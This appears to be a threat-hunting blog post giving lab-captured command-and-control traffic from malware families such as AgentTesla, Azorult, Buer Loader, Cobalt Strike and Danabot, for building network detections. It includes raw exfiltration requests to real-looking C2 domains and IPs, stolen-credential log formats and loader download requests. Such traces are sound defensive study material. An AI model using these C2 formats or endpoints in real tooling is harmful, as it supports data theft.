+				<a href="https://marcoramilli.com/" class="custom-logo-link" rel="home"><img width="43" height="32" src="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/logo-.png?fit=43%2C32&amp;ssl=1" class="custom-logo" alt="Marco Ramilli Web Corner" decoding="async" data-attachment-id="1830" data-permalink="https://marcoramilli.com/logo/" data-orig-file="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/logo-.png?fit=43%2C32&amp;ssl=1" data-orig-size="43,32" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="logo-" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/logo-.png?fit=43%2C32&amp;ssl=1" data-large-file="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/logo-.png?fit=43%2C32&amp;ssl=1" /></a>
+									<p class="site-title"><a href="https://marcoramilli.com/" rel="home">Marco Ramilli Web Corner</a></p>
+				<p class="site-description">Marco Ramilli: cyber security expert, digital entrepreneur and writer</p>			</div><!-- .site-branding -->
+
+			<nav id="site-navigation" class="main-navigation" role="navigation">
+				<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false"><i>menu</i>Primary Menu<span>&nbsp;</span></button>
+
+				<div class="menu-primary-container"><ul id="primary-menu" class="menu"><li id="menu-item-2052" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2052"><a href="https://marcoramilli154858538.wordpress.com">Home</a></li>
+<li id="menu-item-12597" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-12597"><a href="https://marcoramilli.com/cyber-threat-intelligence-feeds/">CTI Feeds</a></li>
+<li id="menu-item-12605" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-12605"><a href="https://marcoramilli.com/ai-ransomware-monitoring/">AI Ransom Monitor</a></li>
+<li id="menu-item-1811" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1811"><a href="https://marcoramilli.com/about-me/">About</a></li>
+<li id="menu-item-3322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3322"><a href="https://marcoramilli.com/books/">Books</a></li>
+<li id="menu-item-7" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7"><a href="https://marcoramilli.com/contact/">Contact</a></li>
+<li id="menu-item-8388" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8388"><a href="https://marcoramilli.com/press-and-media/">Press and Media</a></li>
+<li id="menu-item-2482" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2482"><a href="https://marcoramilli.com/tools/">Cyber Threats Observatory</a>
+<ul class="sub-menu">
+	<li id="menu-item-4162" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4162"><a href="https://marcoramilli.com/cyber-threat-trends/">Cyber Threat Trends</a></li>
+	<li id="menu-item-2630" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2630"><a href="https://marcoramilli.com/potential-apt-detection/">Potential APT Detection</a></li>
+	<li id="menu-item-2490" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2490"><a href="https://marcoramilli.com/malware/">Malware Static Analysis</a></li>
+	<li id="menu-item-2483" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2483"><a href="https://marcoramilli.com/honey-feeds/">Honey Feeds</a></li>
+</ul>
+</li>
+</ul></div>				<i id="menuMarker">Menu</i>
+			</nav><!-- #site-navigation -->
+
+			<!-- Search form -->
+			<div class="search-wrap">
+				
+<form role="search" method="get" class="search-form" action="https://marcoramilli.com/">
+	<label>
+		<span class="screen-reader-text">Search for:</span>
+		<input type="search" class="search-field" placeholder="Start Searching" value="" name="s" autocomplete="off">
+	</label>
+	<input type="submit" class="search-submit" value="Search" disabled="">
+</form>
+				<div class="search-instructions">Press Enter / Return to begin your search.</div>
+				<button id="big-search-close">
+					<span class="screen-reader-text">close search form</span>
+				</button>
+			</div>
+			<div class="search-trigger-wrap">
+				<button id="big-search-trigger">
+					<span class="screen-reader-text">open search form</span>
+					<i class="icon-search"></i>
+				</button>
+			</div>
+
+			<!-- Sidebar trigger -->
+			
+				<div class="sidebar-trigger-wrap">
+					<button id="sidebar-trigger" class="sidebar-trigger">
+						<span class="screen-reader-text">open sidebar</span>
+						<i class="icon-sidebar"></i>
+					</button>
+				</div>
+
+			
+		</div><!-- .container -->
+	</header><!-- #masthead -->
+
+	<button id="scrollDownBtn" class="scroll-down"><i class="icon-left"></i>scroll to discover more</button>
+	<button id="scrollUpBtn" class="scroll-up">back to top<i class="icon-right"></i></button>
+	<a id="badgetop100csb" href="https://marcoramilli.com/2019/08/19/top-100-cyber-security-blog/" style="position: fixed; right: 25px; bottom: 0px; z-index:9999;"><img style="max-width: 100px; opacity: 0.5;" src="https://marcoramilli.com/wp-content/uploads/2019/08/award-icon-06.png"></a> 
+	<!-- Social menu -->
+	
+	<!-- Featured Portfolio Slider -->
+	
+	<div id="content" class="site-content">
+<div class="container container-small customized" style="max-width: 1320px !important; text-align: center;background-color: rgba(128, 128, 128, 0.07);padding: 10px !important; font-size: 15px;"></div>
+	
+
+
+	
+		<div class="container container-medium">
+
+			<div class="hero">
+	    		<!-- Featured media -->
+	    		
+	    		<div class="entry-header">
+	    			<!-- Entry header -->
+	    			<h1 class="entry-title">C2 Traffic Patterns: Personal Notes</h1><div class="entry-meta"><span class="cat-links category-list"><a href="https://marcoramilli.com/category/attack/" rel="tag">Attack</a>&nbsp;<a href="https://marcoramilli.com/category/cyber-crime/" rel="tag">Cyber Crime</a>&nbsp;<a href="https://marcoramilli.com/category/cybersecurity/" rel="tag">cybersecurity</a>&nbsp;<a href="https://marcoramilli.com/category/experience/" rel="tag">experience</a>&nbsp;<a href="https://marcoramilli.com/category/cybersecurity/malware/" rel="tag">malware</a></span><span class="post-date"><a href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/" rel="bookmark"><time class="entry-date published" datetime="2021-01-09T07:32:50+00:00">January 9, 2021</time><time class="updated" datetime="2021-12-24T07:20:40+00:00">December 24, 2021</time></a></span><span class="edit-link"></span></div>	    		</div>
+			</div>
+
+		</div><!-- .container.container-medium -->
+
+		<div id="primary" class="content-area">
+			<main id="main" class="site-main" role="main">
+
+				<div class="container container-small">
+
+					
+<article id="post-9394" class="post-9394 post type-post status-publish format-standard hentry category-attack category-cyber-crime category-cybersecurity category-experience category-malware tag-cybercrime tag-cybersecurity tag-malware-analysis tag-network tag-research tag-tracking">
+
+	<div class="container container-small">
+
+		<div class="entry-content">
+
+			
+<p>Detection is a key point in threat hunting. During the past few weeks, stright in the middle of the winter &#8220;holidays&#8221; (well, maybe if you live in a place where no COVID-19 lockdown was involved), many people re/started a studying program on cybersecurity. Some of them wrote to me asking if there is a way to detect common malware infections through network traces. So I thought it was a nice idea to share some personal and quick notes on that topic.</p>
+
+
+
+<p>BTW The short answer is: Yes there is a way. So it makes sense to trace Malware traffics for studying purposes, but also to find patterns for network detections in real environments.</p>
+
+
+
+<p>First of all you need to build your own laboratory, you might decide to build a dual VM systems, in which VM1 is the victim machine and VM2 is the traffic sniffer or you might decide to have a single victim machine and the main host sniffing and analyzing traffic streams. This is actually my favourite choice: a single MV called &#8220;victim&#8221; where I detonate malwares and the main host (the real machine in which the victim is virtualized) where the traffic tools are run. You need to create a certificate and manke it trusted from the victim machine in order to facilitate the SSL inspection. But this is not a post on how to build your own laboratory, if you are interested on building your own Malware laboratory the following 2 links are great starting points:  </p>
+
+
+
+<ul><li>Christophe wrote a very nice starting post on it: <a href="https://blog.christophetd.fr/malware-analysis-lab-with-virtualbox-inetsim-and-burp/">HERE</a></li><li>Byte-Atlas followed on the topic showung how to harden the machine to reduce Malware Evasion: <a href="http://byte-atlas.blogspot.com/2017/02/hardening-vbox-win7x64.html">HERE</a></li></ul>
+
+
+
+<p>After you set up your own laboratory you are ready to start your tracking process. Following some personal notes on my &#8220;network traceing days&#8221;. Please note the following collection is a mix-up of personal traced network traffic (and already published on gists/reports/repositories/pastebins etc) and the one I found from different friends/posts/reports/repositories as well during the past years. </p>
+
+
+
+<h4 class="wp-block-heading">Traffic Patterns</h4>
+
+
+
+<p>The following paragraphs describe traffic traces captured by executing in a controlled environment some of the most known malware untill now. Please note that I&#8217;ve taken descriptions from <a href="http://malpedia.caad.fkie.fraunhofer.de">Malpedia</a> for reading convenience. </p>
+
+
+
+<div class="wp-block-jetpack-donations">
+	<div class="donations__container">
+		<div class="donations__nav"><div role="button" tabindex="0" class="donations__nav-item" data-interval="one-time">One-Time</div><div role="button" tabindex="0" class="donations__nav-item" data-interval="1 month">Monthly</div></div>
+		<div class="donations__content">
+			<div class="donations__tab">
+				<h4 class="donations__one-time-item">Make a one-time donation</h4><h4 class="donations__monthly-item">Make a monthly donation</h4>
+				<p>Choose an amount</p>
+				<div class="donations__amounts donations__one-time-item"><div class="donations__amount" data-amount="1">¤1.00</div><div class="donations__amount" data-amount="5">¤5.00</div><div class="donations__amount" data-amount="10">¤10.00</div></div><div class="donations__amounts donations__monthly-item"><div class="donations__amount" data-amount="5">¤5.00</div><div class="donations__amount" data-amount="15">¤15.00</div><div class="donations__amount" data-amount="100">¤100.00</div></div>
+				<p>Or enter a custom amount</p><div class="donations__amount donations__custom-amount">
+				
+				<div class="donations__amount-value" data-currency="" data-empty-text="¤0.00"></div>
+			</div>
+				<hr class="donations__separator">
+				<p class="donations__one-time-item">If you think this content is helpful, please consider to make a little donation. It would help me in building and writing additional contributions to community. By donation you will contribute to community as well. Thank you !</p><p class="donations__monthly-item">If you think this content is helpful, please consider to make a little donation. It would help me in building and writing additional contributions to community. By donation you will contribute to community as well. Thank you !</p>
+				<a class="wp-block-button__link donations__donate-button donations__one-time-item" href="https://subscribe.wordpress.com/memberships/?blog=155480246&#038;plan=10519&#038;lang=en_US&#038;pid=9394&#038;redirect=https%3A%2F%2Fmarcoramilli.com%2F2021%2F01%2F09%2Fc2-traffic-patterns-personal-notes">Donate</a><a class="wp-block-button__link donations__donate-button donations__monthly-item" href="https://subscribe.wordpress.com/memberships/?blog=155480246&#038;plan=10520&#038;lang=en_US&#038;pid=9394&#038;redirect=https%3A%2F%2Fmarcoramilli.com%2F2021%2F01%2F09%2Fc2-traffic-patterns-personal-notes">Donate monthly</a>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+
+<h4 class="wp-block-heading">AgentTesla</h4>
+
+
+
+<p>A .NET based keylogger and RAT. Logs keystrokes and the host&#8217;s clipboard, it finally beacons this information back to the C2. It has a modular infrastructure, following some of the traffic grabs for the following modules: </p>
+
+
+
+<p>HTTP</p>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-1 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<pre class="wp-block-code"><code>POST /zin/WebPanel/api.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
+Content-Type: application/x-www-form-urlencoded
+Host: megaplast.co.rs
+Content-Length: 308
+Expect: 100-continue
+Connection: Keep-Alive
+
+HTTP/1.1 100 Continue
+
+p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc0Ul74wtsvtqYLYuTR%2BlFVl%2B5deG0RnTTo6nFc1M9tx0%2BRo7WXetRdIHkmVMMSeqH%2BEroM7yttDzosvKfKgB%2BJ07oqT/YvQ6CPNW2%2BCETCU6oIlO9XYyrEy6/hYeF%2BgkfRc9xSEfZhh/7Wk0khJ4zZJ3cjEvXDxJcQWA739/yDUy4kOAndihYsWnLw1mVCHxJSJf7%2BguB9f4DpgX10NLpH
+</code></pre>
+</div>
+</div>
+
+
+
+<p>FTP</p>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-3 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<pre class="wp-block-code"><code>&lt;html&gt;Time: 11/25/2019 17:48:57&lt;br&gt;User Name: admin&lt;br&gt;Computer Name: VICTIM-PC&lt;br&gt;OSFullName: Microsoft Windows 7 Professional &lt;br&gt;CPU: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz&lt;br&gt;RAM: 4095.61 MB&lt;br&gt;&lt;hr&gt;URL:https://www.facebook.com/&lt;br&gt;
+Username:test@test.com&lt;br&gt;
+Password:testpassword&lt;br&gt;
+Application:Chrome&lt;br&gt;
+&lt;hr&gt;
+URL:192.168.1.1&lt;br&gt;
+Username:test@test.com&lt;br&gt;
+Password:testpassword&lt;br&gt;
+Application:Outlook&lt;br&gt;
+&lt;hr&gt;
+&lt;/html&gt;</code></pre>
+
+
+
+<p>SMTP Ex</p>
+
+
+
+<pre class="wp-block-code"><code>From: office@xxx.]com
+To: officelogs@xxx&#91;.]com
+Date: 12 Oct 2019 17:58:19 +0100
+Subject: admin/VICTIM-PC Recovered Cookies
+Content-Type: multipart/mixed;
+ boundary=--boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
+
+----boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
+
+Time: 10/12/2019 11:58:13&lt;br&gt;UserName: admin&lt;br&gt;ComputerName: VICTI=
+M-PC&lt;br&gt;OSFullName: Microsoft Windows 7 Professional &lt;br&gt;CPU: Int=
+el(R) Core(TM) i5-6400 CPU @ 2.70GHz&lt;br&gt;RAM: 3583.61 MB&lt;br&gt;IP: 18=
+5.183.107.236=0A&lt;hr&gt;</code></pre>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-2 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<h4 class="wp-block-heading">Azorult</h4>
+
+
+
+<p>AZORult is a credential and payment card information stealer. Among other things, version 2 added support for .bit-domains. It has been observed in conjunction with Chthonic as well as being dropped by Ramnit. The following network trace is of one of the most relevant POST action taking back pattern with many &#8220;/&#8221;</p>
+
+
+
+<pre class="wp-block-code"><code>POST /index.php HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
+Host: 51.38.76.57
+Content-Length: 103
+Cache-Control: no-cache
+
+J/.8/.:/.&lt;/.?/.&gt;O.(8.I/.&gt;/.9/.&gt;K.&gt;8.N/.I/.;/.&lt;/.;N.&gt;:.NL.?N.&gt;8.(9.L/.8/.&lt;/.4/.4/.I/.?/.&gt;H.(9.(9.(9.(9.I
+</code></pre>
+
+
+
+<h4 class="wp-block-heading">Buer Loader</h4>
+
+
+
+<p>Buer is a downloader sold on underground forums and used by threat actors to deliver payload malware onto target machines. It has been observed in email campaigns and has been sold as a service since August 2019.</p>
+
+
+
+<pre class="wp-block-code"><code>GET /api/update/YzE0MTY2MGIxZWQ5YzJkMDNmMjQ4MDM0Y2RlZWI2MWM1OTEzYWJmZTIwYWE1OWNjZDFlZjM2ZmZjODViNmVjNTBjNTIyZjY5YjM1MTJiMTc2NzBlNTQwOWFjMWZiZjViZTAzNzdkNWM2NDkxOGE4ZDUwYTMxZjU5ODIzY2QxNTQyMmM5ODM0MjIwNTc5ZGIzNGJiMTMzNWNlMmJlNDJmMjBhMTA5MTVjNWQxZThmN2U0OWJjYjY0ODVjODE4NjQwYjk3YzY0NWU5NjAxNGMxY2U3NWQ2MmI5N2MwY2QzNzlhMmQ2ZmM5ZDFjZjIwNWMwMTEwNWVkNDAyZjY0ZDYyMTg0Y2UyZmJhZmEyYTQxMzBhZWRiNmY0ZjI2ZjFjZmI4MTQwMTBiYzE0Y2Y4NjBiM2U2NGE1NTBhNTc0Y2M4 
+
+HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
+Host: loood1.top
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 12 Nov 2019 20:00:24 GMT
+Content-Type: text/plain; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+ODMtMkQtNzItMUMtMEQtOTgtREEtOTAtMzktNjUtREYtNzYtRDktQkYtQkYtNUEtMDUtNEMtRjAtRkMtMjAtQzctMEUtQzMtRDAtODYtMzYtRTQtOTktMDAtN0YtRDAtNjQtNDctMzktMkYtRTktMTMtM0MtNDgtNjktNTQtNDEtMTktRjMtNUUtQTItNjgtQTUtMjQtNkEtNEItNzItQ0UtODUtRDQtMDAtQjctMTYtNEItOUItMDQtQzgtMTctN0UtRDgtQzctMDAtM0ItN0ItQzUtQTQtMTYtQUEtM0UtNEEtRjMtRUItNDUtQTctMEItMTctOTEtNUItNTQtNEEtODUtNzctNEEtQjUtRTYtMUMtNTktRDEtODctNDQtQkItMjAtNkQtNTgtQzEtMEEtNEItNEMtRTEtNTItM0MtRTItMkYtNTktOEUtMkUtRjItRDgtRjQtOTgtMUYtRjEtNTEtQzktMTUtNTAtQkEtNDktMkUtMzAtRDMtMjUtRDMtODctNEItQjYtRjUtN0MtMUUtMjQtRTktOTgtM0MtNTYtNjYtRTUtRDctQ0UtMDAtNUQtNkEtODUtMDEtQjEtMkMtQjctODUtMkQtMzItNjItNUEtM0UtRUQtMTYtMDYtMjYtMDYtRDMtOTYtMDMtOUEtOTEtN0MtMTUtOTEtRkYtQUItMDItQzItNzctRTItN0EtNDEtMEEtQjAtMzItOUEtMEYtRjQtMDMtNzAtMUYtMEItNTEtMDktM0EtNzQtQjEtODgtMzEtMUQtREEtQTItRjQtMzktNkUtMTctRDItRDktNTQtRDUtOEYtMDAtQkEtODEtNkUtNEUtMzUtQTMtNTItRkQtODctRTMtRDYtMkMtNTQtODctQTItNjYtQzgtM0MtMzgtQzctMEEtM0EtOUQtOEEtMzAtRTAtMDgtMzItMTAtMDgtRjItQjYtRkUtMUQtQzctQzgtQUUtOEYtNjctQUUtNTItMDUtQTktMTAtQUYtM0MtOEUtMTMtN0EtNzItM0YtMzAtRTktMzUtRDMtNTQtQkEtOEQtQzAtMzItQTctRkItNDUtQTMtNTctRTQtMUItMzAtODItNEYtOTEtOTktMUMtRDItRjgtMkEtMzYtRTItODktQjItQkItMUItNjYtQUMtMUItOEMtNjQtRUEtN0QtQkQtMkMtOTktQ0QtQzQtQkQtNzgtQzgtOUMtQjAtNkQtNTYtOEUtRDktREEtOTEtMEEtNkMtQUEtQTQtMUUtRTAtQ0MtMzMtRDMtMjAtRTItNjktMjktQzEtRTQtNjEtMTAtMjUtOTgtNjMtOEUtNTgtNzQtRjctNUEtNEYtNDktQzUtNjItNTEtNTAtNTgtNDktM0QtREQtNjctRDctNjEtMTAtMTktRkItNzUtODYtRUItMEYtQzMtRDMtQkQtMjctNkUtQzYtRDktQkYtQUUtNDAtOEEtMUEtMUQtNjctOEMtMjItNjctQjgtNUQtQzItMTUtREQtODMtNzgtNjctN0ItMTMtNDktNzMtRjMtRTAtNEYtMDUtRkYtQjktQ0ItMkEtMDctQkMtRTgtRTMtREQtMUMtNEEtQUQtQjItMTUtNUEtNDMtMTQtQUEtNDEtMUQtNzAtMUEtREQtNTQtMTYtOTAtNjctMTUtNjUtQTgtMjItMTUtMzgtRDYtNjgtOTQtNDMtNDQtQzgtNkQtMUYtNTAtNkMtMTgtMzMtQjUtNzAtOTQtMDQtNzMtRDMtNjQtMTktNDctNjYtNzgtOTEtQkUtQ0ItRTktREItNkQtODgtRkMtOTAtOTk=GET /api/download/YzE0MTY2MGIxZWQ5YzJkMDNmMjQ4MDM0Y2RlZWI2MWM1OTEzYWJmZTIwYWE1OWNjZDFlZjM2ZmZjODViNmVjNTBjNTIyZjY5YjM1MTJiMTc2NzBlNTQwOWFjMWZiZjViZTAzNzdkNWM2NDkxOGE4ZDUwYTMxZjU5ODIzY2QxNTQyMmM5ZGU0Njc4MDI5MWU2NGJhNTYyMDhiMGI4MDlhNDBkNGQ5NjQ2NWQxYjgzNzYwNmIzYjQxZTViZDU4MDE3YjQyZjZmNTVjNg== 
+
+HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
+Host: loood1.top
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 12 Nov 2019 20:00:24 GMT
+Content-Type: application/*
+Content-Length: 2109952
+Connection: keep-alive
+Last-Modified: Tue, 12 Nov 2019 19:32:38 GMT</code></pre>
+
+
+
+<pre class="wp-block-code"><code>POST / HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3
+Content-Length: 1046
+Host: 162.244.81.87
+
+inekece=MDllNzB&amp;diakwadi=iMzE5OG&amp;xycyad=NiNTYxZTcw&amp;ohxiods=MzA0Yj&amp;akreuq=NmZjUy&amp;qosewyic=MzRmMTk5M&amp;amupawel=jdjZGViY&amp;ydsohuu=jljNzMxZDc&amp;orbemaaf=3ZDExMmEx&amp;inhiadfa=ZjA3MG&amp;kyzeafu=UyYzc0M2&amp;alnaexu=M3NGZj&amp;idsavu=Y2VjM2RhO&amp;nyxyygre=GY3YmR&amp;tuxynool=hMmU3Yzc1O&amp;myweka=DNkMDAwYWF&amp;qeozoszi=kOGRlZD&amp;dygyliaz=diNmZkNW&amp;ykdovy=ZiYmVhY&amp;yvabqua=zA4NWEzN&amp;ugsoetl=2Y3ZDk&amp;wymioxi=xNzIwMTIy&amp;uqafsee=Njg1ZTYwNG&amp;cyyqsady=M3NmQwZj&amp;ykuweddy=hkYTQ5ZTV&amp;emlazebe=hYzc5MGVkZ&amp;imirdaby=mJiMzU&amp;doyvku=wYzRhNzQ&amp;roniym=0YTQ5ZDBi&amp;qyaxwe=MTlmZW&amp;uteqop=NkZjdkN2Z&amp;noylke=lNTg5OGJmM&amp;dedynu=DEzNjgxM&amp;suutyfwu=DBkMjFiYm&amp;riitoked=M3NmJjMDg&amp;waliaw=2ZjNhNW&amp;qiubulo=EzZGU2Zm&amp;urehuz=UxNzhjZj&amp;guizpuat=kzYjMzMz&amp;ziapluc=IzODIyYT&amp;orygybib=Y2OGUwY&amp;ebilxufo=2RmYzllM&amp;wesekuy=DVlZThmYTQ&amp;buapxa=3MGVmZDM&amp;lisoxu=xNTlkZ&amp;usgager=TBmOTc4ZDY&amp;cuehlumy=0ZTA5OTZlO&amp;raxyuh=DE2MTA0YWN&amp;piuluwyc=iYjQ4NjE0&amp;gybetez=MzQ3ZW&amp;isvazugo=NhZDExZGEz&amp;obalozha=YmJjZDQ4&amp;pivoewta=NzljOTI&amp;dakiva=xMTE4ND&amp;luzaih=A4OGEz&amp;sesyaci=Mzk0ZWE1YT&amp;opheteow=AxNjQwN&amp;ebzyluo=zBkZWYy&amp;osfiuk=ODc2&amp;yzxaob=NDVmMTViNjdkZDli&amp;exmuur=suirufy
+</code></pre>
+
+
+
+<h4 class="wp-block-heading">Cobalt Strike</h4>
+
+
+
+<p>Cobalt Strike is a paid penetration testing product that allows an attacker to deploy an agent named &#8216;Beacon&#8217; on the victim machine. Beacon includes a wealth of functionality to the attacker, including, but not limited to command execution, key logging, file transfer, SOCKS proxying, privilege escalation, mimikatz, port scanning and lateral movement. Beacon is in-memory/file-less, in that it consists of stageless or multi-stage shellcode that once loaded by exploiting a vulnerability or executing a shellcode loader, will reflectively load itself into the memory of a process without touching the disk. It supports C2 and staging over HTTP, HTTPS, DNS, SMB named pipes as well as forward and reverse TCP; Beacons can be daisy-chained. Cobalt Strike comes with a toolkit for developing shellcode loaders, called Artifact Kit.</p>
+
+
+
+<p>The Beacon implant has become popular amongst targeted attackers and criminal users as it is well written, stable, and highly customizable.</p>
+
+
+
+<p>Following a general profile</p>
+
+
+
+<pre class="wp-block-code"><code>GET /Mdt7 HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; NP06)
+Host: 192.168.1.44
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Wed, 16 Nov 2019 02:13:32 GMT
+Content-Type: application/octet-stream
+Content-Length: 213589
+
+.......
+w.z....=..........C.D.'.'Z.2....:1....R..1...1.......1.9.t...^.......3.Q.3.R.~...~..........6a..6a-L^.............................................`.....W...?...O...=...^...1...T...:.......:..._...U...U...U.v.......v......,9
+.W.E.3k..a....9..l.T..k...........J......;J.._.k...$......J....h...'..qD
+
+GET /push HTTP/1.1
+Accept: */*
+Cookie: TwJl1o2Nzk3+xmC39FsNTbyJPGHyNxllFZ8wZUwR831SYmTwrxoGydXQGF1ej89K1t0rTLgzjd95c8127hlZ6SQ4hx95YrYuRHooitXYGEAxtbKv53LJ6K+6r1y1OQU3n0+O93xxPiyx6RvPeKzlACbO4nEc5YKzh0vAfWJvlm0=
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)
+Host: 192.168.1.44
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Wed, 16 Nov 2019 02:017:31 GMT
+Content-Type: application/octet-stream
+Content-Length: 0</code></pre>
+
+
+
+<p>Following Amazon C2 profile (from external sources)</p>
+
+
+
+<pre class="wp-block-code"><code>GET /s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books HTTP/1.1
+Host: www.amazon.com
+Accept: */*
+Cookie: skin=noskin;session-token=MM4bZQ5WUPUrn7TPQuCWct6G+WGXZaLdezMQVEv8PHnB7tnvTk7ct3W71pQmn2NMJQD7IFbjPnKJV27tKshA8AjgzpXoeUtOIrDiBEg0x3AesYq52s74IbjnsVA+wASo0D6L23fd87XNDUiBro5wNBzcybUOADAO1fjCobw5MAw=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Fri, 13 Dec 2019 17:48:39 GMT
+Server: Server
+x-amz-id-1: THKUYEZKCKPGY5T42PZT
+x-amz-id-2: a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=
+X-Frame-Options: SAMEORIGIN
+Content-Encoding: gzip
+Content-Length: 0</code></pre>
+
+
+
+<p>Following a safebrowsing profile (from external sources)</p>
+
+
+
+<pre class="wp-block-code"><code>GET /safebrowsing/ref/eNKSXUTdWXGYAMHYg2df0Ev1wVrA7yp0T-WrSHSB53oha HTTP/1.1
+Accept-Language: en-US
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip
+Host: novote.azureedge.net
+Cookie: PREF=ID=foemmgjicmcnhjlacgackacadbclcmnfoeaeeignjhiphdgidlmahkgbchcahclpfcadjnegckejpiofbmllpnaeancgbikcdjohkekapgnkgiijobnknkgiahmkcjipnncehcamnopcmlngcboppjdplhhobhgekdcblgpkdggeklenpcabdkhhhaedogkacljhdgdphfanfbmcbnkgjmplhdkomllhnnoppchchejooiplahpgpmfaegdcpbnd
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Content-Encoding: gzip
+Age: 1609
+Alternate-Protocol: 80:quic
+Cache-Control: public,max-age=172800
+Content-Type: application/vnd.google.safebrowsing-chunk
+Date: Fri, 22 Nov 2019 13:34:50 GMT
+Server: ECAcc (frb/67BC)
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+Content-Length: 82480</code></pre>
+</div>
+</div>
+</div>
+</div>
+
+
+
+<h4 class="wp-block-heading">Danabot</h4>
+
+
+
+<p>Proofpoints describes DanaBot as the latest example of malware focused on persistence and stealing useful information that can later be monetized rather than demanding an immediate ransom from victims. The social engineering in the low-volume DanaBot campaigns we have observed so far has been well-crafted, again pointing to a renewed focus on “quality over quantity” in email-based threats. DanaBot’s modular nature enables it to download additional components, increasing the flexibility and robust stealing and remote monitoring capabilities of this banker.</p>
+
+
+
+<p>It looks like TLS traffic, but it really isen&#8217;t. The matching flag is on &#8220;24 01 00 00&#8221; pattern and following 24 byte first packet. (external take)</p>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-4 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<pre class="wp-block-code"><code>00000000  24 01 00 00 00 00 00 00 e5 7c 00 00 00 00 00 00    $....... .|......
+00000010  09 7e 00 00 00 00 00 00                            .~...... 
+</code></pre>
+
+
+
+<h4 class="wp-block-heading">Darkcomet</h4>
+</div>
+</div>
+
